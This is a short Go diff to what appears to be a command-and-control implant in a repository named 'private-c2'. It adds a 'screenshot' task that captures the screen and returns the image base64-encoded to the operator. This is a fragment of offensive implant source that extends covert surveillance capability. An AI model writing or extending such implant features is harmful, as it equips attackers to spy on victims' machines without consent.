@@ -21,6 +21,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/azizbinmohammad/private-c2/implant/modules/screenshot"
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
 	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
@@ -163,6 +164,13 @@ func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
 			return "", err
 		}
 		return base64.StdEncoding.EncodeToString(data), nil
+
+	case "screenshot":
+		result, err := screenshot.Execute(ctx, []byte(task.Args))
+		if err != nil {
+			return "", err
+		}
+		return base64.StdEncoding.EncodeToString(result), nil
 
 	default:
 		return "", fmt.Errorf("unknown task type: %s", task.Type)
